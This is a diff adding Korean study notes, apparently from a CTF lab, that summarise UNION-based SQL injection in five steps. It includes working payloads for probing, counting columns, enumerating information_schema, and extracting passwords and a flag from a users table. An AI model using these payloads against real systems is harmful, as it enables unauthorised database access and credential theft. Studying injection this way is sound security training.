@@ -581,3 +581,32 @@ WHERE 조건: table_name = 'users'
 ' UNION SELECT 1, 2, flag, 4 FROM users ; #
 
 => 결과가 화면에 바로 출력됨
+
+정리하자면,
+```
+UNION SQL Injection 5단계 과정
+1. 취약점 위치 파악하기
+입력값이 SQL 쿼리에 그대로 들어가는지 확인
+예) ' OR '1'='1 같은 간단한 페이로드로 반응 확인
+
+2. 컬럼(column) 수 파악하기
+ORDER BY나 UNION SELECT로 컬럼 개수를 맞춰야 함
+예) ' ORDER BY 3 -- (오류 없으면 3개 컬럼 존재)
+또는 ' UNION SELECT 1,2,3 -- 으로 성공하는 컬럼 개수 찾기
+
+3. 출력 가능한 컬럼 위치 확인하기
+UNION SELECT에 숫자 대신 문자열 넣어 어떤 컬럼이 웹에 출력되는지 찾기
+예) ' UNION SELECT 'a', 'b', 'c' -- 로 a,b,c 중 어느 값이 노출되는지 확인
+
+4. DB 구조 정보 수집하기
+information_schema에서 DB 이름, 테이블 이름, 컬럼 이름을 쿼리해 확인
+예) DB 이름: ' UNION SELECT 1, 2, schema_name, 4 FROM information_schema.schemata --
+테이블 이름: ' UNION SELECT 1, 2, table_name, 4 FROM information_schema.tables WHERE table_schema='board' --
+컬럼 이름: ' UNION SELECT 1, 2, column_name, 4 FROM information_schema.columns WHERE table_name='users' --
+
+5. 민감 데이터 추출하기
+실제 테이블과 컬럼을 이용해 데이터 조회
+예) ' UNION SELECT id, email, password, flag FROM users --
+원하는 데이터를 웹페이지에 노출시킴
+```
+
